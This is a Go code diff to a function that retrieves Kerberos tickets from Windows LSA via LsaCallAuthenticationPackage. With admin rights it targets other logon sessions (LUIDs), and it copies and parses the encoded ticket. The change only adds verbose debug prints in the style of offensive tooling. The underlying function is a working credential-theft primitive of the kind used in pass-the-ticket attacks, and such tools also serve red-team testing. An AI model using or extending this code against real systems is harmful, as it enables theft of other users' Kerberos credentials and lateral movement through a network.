@@ -489,12 +489,14 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 	}
 
 	isAdmin, _ := isAdmin()
+	fmt.Printf("[*] Extracting ticket with admin: %v, LUID: 0x%x:0x%x\n", isAdmin, luid.HighPart, luid.LowPart)
 
 	targetNameUTF16 := windows.StringToUTF16(targetName)
 	nameLen := uint16(len(targetNameUTF16) * 2)
 
 	requestSize := unsafe.Sizeof(KerbRetrieveTktRequest{})
 	totalSize := requestSize + uintptr(nameLen)
+	fmt.Printf("[*] Request size: %d, Total size: %d\n", requestSize, totalSize)
 
 	buffer := make([]byte, totalSize)
 	bufferPtr := unsafe.Pointer(&buffer[0])
@@ -504,8 +506,10 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 
 	if !isAdmin {
 		request.LogonId = windows.LUID{LowPart: 0, HighPart: 0}
+		fmt.Printf("[*] Using null LUID for non-admin context\n")
 	} else {
 		request.LogonId = luid
+		fmt.Printf("[*] Using provided LUID: 0x%x:0x%x\n", luid.HighPart, luid.LowPart)
 	}
 
 	request.TicketFlags = 0
@@ -514,16 +518,18 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 	request.CredentialsHandle = SecurityHandle{}
 
 	targetNamePtr := uintptr(bufferPtr) + requestSize
+	fmt.Printf("[*] Target name buffer offset: %d\n", requestSize)
 
 	stringData := unsafe.Slice((*byte)(unsafe.Pointer(&targetNameUTF16[0])), nameLen)
 	targetSlice := unsafe.Slice((*byte)(unsafe.Pointer(targetNamePtr)), nameLen)
 	copy(targetSlice, stringData)
 
 	request.TargetName = LsaString{
-		Length:        nameLen - 2, // Subtract null terminator
+		Length:        nameLen - 2,
 		MaximumLength: nameLen,
 		Buffer:        targetNamePtr,
 	}
+	fmt.Printf("[*] LSA String - Length: %d, MaxLength: %d\n", request.TargetName.Length, request.TargetName.MaximumLength)
 
 	fmt.Printf("[*] Attempting to extract ticket for %s (Admin: %v)\n", targetName, isAdmin)
 	fmt.Printf("[*] Target name length: %d bytes\n", nameLen)
@@ -532,6 +538,7 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 	var returnLength uint32
 	var protocolStatus uint32
 
+	fmt.Printf("[*] Calling LsaCallAuthenticationPackage...\n")
 	ret, _, _ := LsaCallAuthenticationPackage.Call(
 		uintptr(lsaHandle),
 		uintptr(authPackage),
@@ -541,6 +548,7 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 		uintptr(unsafe.Pointer(&returnLength)),
 		uintptr(unsafe.Pointer(&protocolStatus)),
 	)
+	fmt.Printf("[*] LsaCallAuthenticationPackage returned: 0x%x, Protocol Status: 0x%x\n", ret, protocolStatus)
 
 	if ret != 0 {
 		return nil, fmt.Errorf("LsaCallAuthenticationPackage failed: 0x%x", ret)
@@ -550,21 +558,30 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 		return nil, fmt.Errorf("protocol status error: 0x%x", protocolStatus)
 	}
 
+	fmt.Printf("[*] Response pointer: 0x%x, Return length: %d\n", responsePtr, returnLength)
 	if responsePtr != 0 {
 		defer LsaFreeReturnBuffer.Call(responsePtr)
 		response := (*KerbRetrieveTktResponse)(unsafe.Pointer(responsePtr))
 		encodedTicketSize := response.Ticket.EncodedTicketSize
+		fmt.Printf("[*] Encoded ticket size: %d\n", encodedTicketSize)
+
 		if encodedTicketSize > 0 {
+			fmt.Printf("[*] Copying encoded ticket data...\n")
 			encodedTicket := make([]byte, encodedTicketSize)
 			copy(encodedTicket,
 				(*[1 << 30]byte)(unsafe.Pointer(response.Ticket.EncodedTicket))[:encodedTicketSize])
 
+			fmt.Printf("[*] Attempting to parse ticket data...\n")
 			krbCred, err := parseTicketData(encodedTicket)
 			if err != nil {
 				return nil, fmt.Errorf("failed to parse ticket data: %v", err)
 			}
+			fmt.Printf("[+] Successfully parsed ticket data\n")
 			return krbCred, nil
 		}
+		fmt.Printf("[-] Encoded ticket size is 0\n")
+	} else {
+		fmt.Printf("[-] Response pointer is null\n")
 	}
 
 	return nil, fmt.Errorf("KRB_RETRIEVE_TKT_RESPONSE failed")
